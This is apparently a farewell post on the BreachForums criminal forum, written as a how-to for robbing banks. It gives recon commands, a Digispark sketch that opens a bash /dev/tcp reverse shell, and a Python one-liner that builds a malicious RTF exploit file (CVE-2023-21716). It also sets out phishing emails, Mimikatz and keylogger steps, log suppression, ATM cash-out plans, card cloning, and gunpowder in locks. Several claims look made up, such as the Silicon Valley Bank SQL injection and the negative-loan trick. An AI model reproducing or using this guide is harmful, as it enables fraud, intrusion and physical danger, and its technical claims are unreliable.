Hello everyone, I hope you're all doing well and in good spirits. At the end of last July, my team and I decided to take a vacation, and I spent part of August here. But now, the vacation is over, and we need to get back to work. Today is my last day on BreachForums. I wanted to share some topics here to help out new hacker friends, even if just a little. I hope the topics I've shared have taught you something useful. Now, before I leave the forum, I want to share one last topic. If you want to learn how banks are hacked, keep reading  
  
What I am about to tell requires teamwork.  
  
First, it's important to note that even a simple port scan can keep a bank on high alert for weeks. Unfortunately, if you engage in active information gathering, the bank might not catch you, but they will likely anticipate an upcoming cyberattack or intrusion attempt and take extra precautions. So, avoid active information gathering and focus on passive information gathering instead. The information you need to obtain includes: companies partnered with the bank, bank employees, the families of bank employees, all domains associated with the bank, and the bank's major and potential clients.  
  
You can find the companies partnered with the bank on the bank’s website. You can discover bank employees by checking the followers on the bank's social media accounts, and you can use the same method to find their families. As for the bank’s domains, you need to find and list them all. For this task, I recommend using the Dnsenum tool, but you can also use Dnsmap  
  

`dnsenum -enum target.com`

`dnsmap target.com   Additionally, the Dnsmap tool has an extra feature: if you want to find subdomains using a wordlist, you can use the -w parameter. For example:   dnsmap target.com -w /root/bip.txt`

  
Unfortunately, the subdomains you find need to be examined one by one to check for any vulnerabilities. Now you understand why hackers are often sleep deprived, right  
  
At this stage, the vulnerabilities you are most likely to find are as follows: Logic errors. For example, let’s say you have two separate accounts at a bank, one is an investment account and the other is a regular checking account. You transfer money from your investment account to your regular account, but even though there’s no money in your investment account, the transfer still goes through. This indicates the presence of a bug—the system is transferring money to your account without checking your investment account’s balance. This flaw was discovered by two idiots at a Turkish bank called Akbank in 2022. I call them idiots because these fools stole a billion dollars and were caught before they could even spend 0.00000001% of it, simply because a traffic cop got suspicious. Yes, these guys were so dumb that they were busted by a traffic cop. If I had found that vulnerability, I would have made that bank live a nightmare.  
Another logic error is entering negative numbers. How does that work, you ask? For example, you go to the bank’s loan application page, and it asks you how much loan amount you want. If you enter -1000 and press the confirm button, the system will owe you $1000, and the money will be automatically added to your balance while canceling the loan process. This vulnerability existed in some banks until 2019, but once hacker groups noticed it, the flaw was patched the same day it was discovered. So, look for similar logic errors.  
I'll give you an example of a logic error that my team and I found, but let me tell you which bank it was in—Silicon Valley Bank. The vulnerability worked like this: you clicked the search button, entered a double quotation mark (") in the search bar, then entered the desired account number and added a simple SQL query. This would bring up all the information related to that account, including login details. After that, it was easy—log into the account, take some money. Despite being very careful, the bank somehow noticed us and patched the flaw. Below, I’m leaving the bank's website. If you visit the site and enter a double quotation mark (") in the search bar, you’ll see that the site immediately removes the quotation mark  
[https://www.svb.com/](https://www.svb.com/)  
  
If you find a logic error, shape your strategy around it. If you don’t, then a comprehensive cyberattack comes into play. Target the bank’s employees and partners with the information you've gathered about them. Collect all useful information about these targets. As usual, I'll explain through an example scenario. Let's say the bank made a deal with a company, and you know all the employees of this company, as well as where they live. One of these employees lives in an apartment building. I'll share one of the tactics used by my team and me. First, you need to identify the floor and the exact apartment the employee lives in (you can do this by checking the doorbells). Then, you need to access the building’s main router on the ground floor. Physical access is required—the router is likely behind a locked door. You can learn how to bypass locks even from YouTube videos, but my recommendation is to sprinkle a tiny amount of white gunpowder into the keyhole and ignite it. The explosion will cause the lock pins to release, and don’t worry, this explosion is harmless and will make very little noise Those who don't believe the lock will open with gunpowder can test it at home  
  
After opening the lock, the router cover will most likely be locked as well. You can open it with a knife or use your credit card. And there you have it—the router. Here, use a Digispark, an Arduino card. It's very easy to use—just plug the card into one of the router's USB ports, wait 10 seconds, and then remove it. Digispark is a special Arduino card, and its unique feature is that it runs the program stored in it when plugged into a device. So, if the card's program contains a reverse shell code, it will open a remote shell on all the devices it’s connected to. Of course, you’ll need to program the card first. Let’s take a small detour and show you how to program the Digispark before continuing with the topic  
  ]]![[Pasted image 20240831192335.png]]
![[Image: 68747470733a2f2f73332e616d617a6f6e617773...352e706e67]](https://external-content.duckduckgo.com/iu/?u=https://camo.githubusercontent.com/9e94f973644db891612ac6f930cb0d1e9818c9c1a2af8e1fc41bd39895dbb70c/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f63687269733430382e636f6d2f617474696e7938352e706e67)  
  
This is the Digispark you see in the picture, and as you can see, it's quite small. We need to place a remote shell code, compatible with Linux, into this little device   
  
Requirements:  

1. Digispark USB Development Board  
    
2. Arduino IDE (Integrated Development Environment)  
    
3. Digispark Arduino Add-On for Arduino IDE  
    
4. USB Cable for connecting the Digispark  
    

Steps:  
  

1. Install the Arduino IDE:  
    - Download and install the Arduino IDE from the official Arduino website.  
        
2. Install the Digispark Add-On:  
    - Open the Arduino IDE.  
        
    - Go toFile> Preferences (or Arduino>Preferences on macOS)  
        
    - In the "Additional Boards Manager URLs" field, add the following URL:[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)  
        
    - Click OK to save the preferences.  
        
3. Install the Digispark Board:  
    - Go to Tools>Board>Boards Manager  
        
    - Search for "Digispark" in the search bar.  
        
    - Find "Digistump AVR Boards" and click  
        Install  
        
4. Select the Digispark Board:  
    - Go to Tools Board and select Digispark (Default - 16.5mhz)  
        
5. Connect the Digispark:  
    - Connect the Digispark to your computer using a USB cable.  
        
6. Open or Write Your Code:  
    - You can write your own code or use an existing sketch. For example, if you want to load a remote shell script, you would include the necessary code within the Arduino sketch.  
        
7. Upload the Code:  
    - Click the  
        Upload  
        button in the Arduino IDE.  
        
    - The Digispark board will initially show up as a "new device" and then will reset to begin the upload process. Follow the on-screen instructions if the IDE prompts you to press the reset button on the Digispark.  
        
8. Verify and Test:  
    - Once the upload is complete, the Digispark will execute the code you programmed. You can test its functionality to ensure it works as expected.  
        

  
The code we will write inside the Digispark  

`// Tony Montana   #include <DigiKeyboard.h>      const char* ip = "192.168.1.100"; // Replace with the IP address of your listener   const int port = 4444;            // Replace with the port number of your listener      void setup() {     // Send a key stroke to open a terminal     DigiKeyboard.sendKeyStroke(0);     DigiKeyboard.delay(500);         // Open a terminal     DigiKeyboard.println("gnome-terminal");     DigiKeyboard.delay(2000);         // Type the reverse shell command     DigiKeyboard.println("bash -i >& /dev/tcp/" + String(ip) + "/" + String(port) + " 0>&1");         // Close the terminal     DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // ALT + F4 to close   }      void loop() {     // Digispark does not use the loop function for this example   }`

  
Now that we have gained access to the router, we can easily access the company's employee network and install a RAT program on their computer. Then, use their account to send an email to the bank (Hello, we apologize for disturbing you at this hour, but due to an urgent decision by our board of directors, some financial changes have been made. I wanted to inform you about these changes. The decisions made by our company are listed in the attached file. Please read it, and if your bank agrees to these terms, please let us know). Attach a file with a payload to this message (it can be in PDF, RTF, DOCX, or any other extension). Below is an example of an RTF exploit code that you can use, even though it has been patched, it is still a common vulnerability.  
  

`open("malicious.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch No Crash}\n}}\n").encode('utf-8'))`

  
Running this code will create a malicious RTF file. If you want more information about this vulnerability, visit this source [CVE-2023-21716 Exploit](https://www.picussecurity.com/resource/blog/cve-2023-21716-microsoft-word-remote-code-execution-exploit-explained)  
  
After infiltrating the bank employee’s computer, send a second email (Hello again, I would like to inform you that our company is retracting the financial decisions it previously made. We will not be making any changes to our decisions, and our financial partnership will continue as before. Have a good day). The reason for sending this second email is to prevent the agreement changes we proposed in the first email from being implemented. Imagine making changes to a million-dollar deal overnight, and the next day the company says it was unaware of this. If your attack does not achieve its goal, it will end in failure. Anyway, now that we’ve accessed the bank employee’s computer, it’s time for the next stages  
  
After infiltrating the bank employee’s computer, use it as a base. First, use Mimikatz to check whether the security of that computer is strong or weak, and raise the log records to a critical level. This way, the computer will only keep critical log records and won’t record any other logs. To avoid detection of malicious software traffic, use a domain that appears harmless. Then, you need to find the domain controller. This step is difficult because the domain controller is hidden using special methods, but you can still access the domain controller from the administrator’s computer. At this stage, you need to infiltrate the bank administrator’s computer. My team and I (I’m not the team leader) use a zero-day vulnerability we discovered ourselves, which we named Elite Cobra. Unfortunately, I can't share Elite Cobra with you, but I can suggest an alternative vulnerability  
  
[CVE-2023-21823](http://After%20infiltrating%20the%20bank%20employee’s%20computer,%20use%20it%20as%20a%20base.%20First,%20use%20Mimikatz%20to%20check%20whether%20the%20security%20of%20that%20computer%20is%20strong%20or%20weak,%20and%20raise%20the%20log%20records%20to%20a%20critical%20level.%20This%20way,%20the%20computer%20will%20only%20keep%20critical%20log%20records%20and%20won’t%20record%20any%20other%20logs.%20To%20avoid%20detection%20of%20malicious%20software%20traffic,%20use%20a%20domain%20that%20appears%20harmless.%20Then,%20you%20need%20to%20find%20the%20domain%20controller.%20This%20step%20is%20difficult%20because%20the%20domain%20controller%20is%20hidden%20using%20special%20methods,%20but%20you%20can%20still%20access%20the%20domain%20controller%20from%20the%20administrator’s%20computer.%20At%20this%20stage,%20you%20need%20to%20infiltrate%20the%20bank%20administrator’s%20computer.%20My%20team%20and%20I%20(I’m%20not%20the%20team%20leader)%20use%20a%20zero-day%20vulnerability%20we%20discovered%20ourselves,%20which%20we%20named%20Elite%20Cobra.%20Unfortunately,%20I%20can't%20share%20Elite%20Cobra%20with%20you,%20but%20I%20can%20suggest%20an%20alternative%20vulnerability) you can clan this and [[https://github.com/ycdxsb/WindowsPrivilegeEscalation?tab=readme-ov-file#cve-2023-21823]]  There are a lot of zero-day vulnerabilities in this repository  
  
Using these vulnerabilities, you can infiltrate the administrator’s computer. The detailed explanation of all the vulnerabilities is available, so I won’t go over them again—I don’t want to make the post even longer. After infiltrating the administrator's computer, install a keylogger and wait, or run programs that slow down the computer and mark these programs as startup applications, then activate your keylogger. Since the administrator’s computer will be slow, they will notify technical support. Every time the technician enters the administrator’s password to inspect the computer, the keylogger will send that password to you. The technician will likely think that the issue is due to the startup applications and fix it. Now, you can connect to the domain controller as the administrator. Once connected, you can either transfer the money via the SWIFT system to another bank in another country, open an anonymous account and transfer the money there, or take the more difficult but secure route and move the money outside the financial system  
  
Now I'll explain how to move the money out of the financial system. With the domain controller in our hands, we can control all the ATMs connected to that bank. For those who don't know, bank ATMs are connected to the internet and the bank's internal network and can be controlled via the domain controller over the internet. The plan is simple: two members of an eight-person team stay at the computers while the other six take backpacks and go from ATM to ATM. When they reach an ATM, the team at the computers will give the command to dispense cash from that ATM, and the ATM will dispense money even without inserting a card. Be mindful of fingerprints. As the six field operatives fill their backpacks with cash, they will bring it to a predetermined location and unload it, repeating the process all night. However, be aware that the bank will quickly notice the missing funds and quarantine the entire system for investigation. So, once you've gathered enough money, erase your software from the bank's system and leave. That's what we do, but if you're confident, you can stay in the system. As for how to find the IPs of the ATMs, there's no need to worry—the necessary information is already available in the domain controller.  
  
Since the method I described can only be executed by professional hackers, I will suggest different alternatives for you  
  
MagSpoof  
![[Pasted image 20240831192318.png]]
Using this device, you can clone any credit or debit card you want, and it also allows you to use the copied card information  
  
You can apply the method I described by targeting the bank employee's family instead of the company  
  
Or you can take out the maximum loan you can from all the banks in your country and then flee to another country to disappear  
  
Yes, that's it for now. I hope this has been helpful. I really need to get back to work. Honestly, this forum has made me feel nostalgic. My early hacking years were spent on 4chan and the legendary RaidForums.com. Back then, I wasn't even a hacker, not even a lamer—I was just an ordinary person. I still don't see myself as a real hacker, and this one-month stay on this forum has been really good. But you know what's missing here? There's no sense of community spirit on BreachForums. RaidForums wasn't like this; it had that community vibe. As good as the new forums are, you always find yourself longing for the old days. Anyway, there's no point in getting sentimental. No matter how much we complain, the RaidForums community is gone and will never come together again.  
Before I leave the forum, there are a few things I want to say to some users.  
First of all,   
  
@[DredgenSun](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-DredgenSun), you're an amazing person. I hope life always brings good people your way.  
  
@[seraph8](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-seraph8), my friend, you're simply a crazy person, you know that? Many think you're a fool, but I don't. I think you just love to have fun.  
  
@[termit](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-termit), I've read all your posts and comments, and to be honest, we're on the same wavelength. We could have been great friends in real life.  
  
@[workingforyou](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-workingforyou), I believe you're going to be a fantastic hacker.  
  
@[komi](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-komi), you know, Komi, you're incredibly annoying, but that's a good thing. If it weren't for you, this forum wouldn't be as fun and lively. You're the life of this forum.  
  
@[shearunnatrckstr](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-shearunnatrckstr), we met under bad circumstances. I wish we'd met under better ones. But think of it this way: without the painful moments in life, what meaning would the sweet ones have? You're a genuinely good person, and I hope life always brings good people your way.  
  
@[FreddyFederali](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-FreddyFederali), my friend, you have an amazing capacity for observation and understanding, and that's a really good thing. I'm sure you'll be very successful in real life.  
  
@[netnsher](http://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/User-netnsher), I honestly don't know what to say to you. I really hurt your feelings badly because of that stupid troll incident, and here, in front of the whole forum, I'm apologizing again. I hope you find happiness in the rest of your life, and that you don't come across people like me  
  
Lastly, if anyone speaks ill of me after I'm gone, my response is: small men always talk behind the backs of great men  
  
Goodbye everyone, take care of yourselves. I hope you all find happiness.